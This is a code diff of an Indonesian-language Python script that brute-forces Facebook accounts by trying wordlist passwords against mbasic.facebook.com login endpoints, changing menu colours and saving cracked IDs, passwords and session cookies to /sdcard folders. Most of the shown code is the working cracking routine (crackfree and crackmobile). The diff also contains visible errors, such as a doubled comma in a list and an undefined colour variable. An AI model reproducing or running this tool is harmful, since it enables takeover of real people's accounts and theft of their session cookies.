@@ -329,7 +329,7 @@ u = '\033[95m' # UNGU
 kk = '\033[33m' # KUNING -
 b = '\33[1;96m' # BIRU -
 p = '\x1b[0;34m' # BIRU +
-asu = random.choice([m,k,h,u,b])
+asu = random.choice([m,k,h,u,b,A2,J2,P2,,M2,,N2,O2,B2])
 ###----------[ CONVERT BULAN ]----------###
 rb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
 tg = datetime.datetime.now().day
@@ -545,12 +545,12 @@ def nge_krek():
 
 ###----------[  ATUR DULU STER ]----------###
 def atur_dulu():
-	print(f'{ung}')
-	print(f'━─═ ◕➤ [[{biru}CRACK DARI ID{kun}]]')
-	print(f'━─═ ◕➤1. SUGIONO [{kun}TUA{kun}]')
-	print(f' ━─═ ◕➤2. EFA ELVIE [{kun}MUDA{kun}]')
-	print(f' ━─═ ◕➤3. MARIA OZAWA [{kun}ACAK{kun}]')
-	aturid = input(f'{hijo}━─═ ◕➤: ')
+	print(f'{asu}')
+	print(f'━─═ ◕➤ [[{asu}CRACK DARI ID{adu}]]')
+	print(f'━─═ ◕➤1. SUGIONO [{asu}TUA{asu}]')
+	print(f' ━─═ ◕➤2. EFA ELVIE [{asu}MUDA{asu}]')
+	print(f' ━─═ ◕➤3. MARIA OZAWA [{asu}ACAK{asu}]')
+	aturid = input(f'{asu}━─═ ◕➤: ')
 	if aturid in ['1','01']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -569,12 +569,12 @@ def atur_dulu():
 			xnxx = random.randint(0,len(id2))
 			id2.insert(xnxx,acak)
 	else:
-		baz_anim(f'{biru} ━─═ ◕➤yang bener lah ster')
+		baz_anim(f'{asu} ━─═ ◕➤yang bener lah ster')
 		exit()
-	print(f'{ung}')
+	print(f'{asu}')
 	print('━─═ ◕➤ 1. MS')
 	print(' ━─═ ◕➤2. REG (Dijamin Gacor)')
-	metod = input(f'{biru}>> : ')
+	metod = input(f'{asu}>> : ')
 	if metod in ['1','01']:
 		baz.append('free')
 	elif metod in ['2','02']:
@@ -586,7 +586,7 @@ def atur_dulu():
 ###----------[  BAGIAN WORDLIST ]----------###
 def passwrd():
 	global prog,des
-	print(f'{biru}')
+	print(f'{asu}')
 	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 	des = prog.add_task('',total=len(id))
 	with prog:
@@ -628,10 +628,10 @@ def passwrd():
 					gas_krek.submit(crackmobile,idf,pwv)
 				else:
 					gas_krek.submit(crackfree,idf,pwv)
-		print(f'{hijo}')
-		print(f'{biru}+ {puti}akun ok : {biru}%s{kun} '%(ok))
-		print(f'{ung}+ {mer}akun cp : {ung}%s{kun} '%(cp))
-		print(f'{hijo}')
+		print(f'{asu}')
+		print(f'{asu}+ {asu}akun ok : {biru}%s{kun} '%(ok))
+		print(f'{asu}+ {mer}akun cp : {ung}%s{kun} '%(cp))
+		print(f'{asu}')
 		
 def cektahun(fx):
 	if len(fx)==15:
@@ -682,7 +682,7 @@ def crackfree(idf,pwv):
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
-				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
+				open('/sdcard/CP/'+cph,'a').write(idf+'|'+pw+'\n')
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
@@ -691,7 +691,7 @@ def crackfree(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				kukis = kuki.replace(f'c_user={idf};datr','sb')
 				print(f'\r{x}[{b}✓{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('/sdcard/OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 				
 			else:
@@ -736,7 +736,7 @@ def crackmobile(idf,pwv):
 			po = ses.post(link,data=data,headers=headers,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
-				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
+				open('/sdcard/CP/'+cph,'a').write(idf+'|'+pw+'\n')
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
@@ -745,7 +745,7 @@ def crackmobile(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				kukis = kuki.replace(f'c_user={idf};datr','sb')
 				print(f'\r{x}[{b}✓{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('/sdcard/OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 				
 			else:
@@ -754,8 +754,8 @@ def crackmobile(idf,pwv):
 			waktu(31)
 	loop+=1
 if __name__=='__main__':
-	try:os.mkdir('OK')
+	try:os.mkdir('/sdcard/OK')
 	except:pass
-	try:os.mkdir('CP')
+	try:os.mkdir('/sdcard/CP')
 	except:pass
 	login_baz()
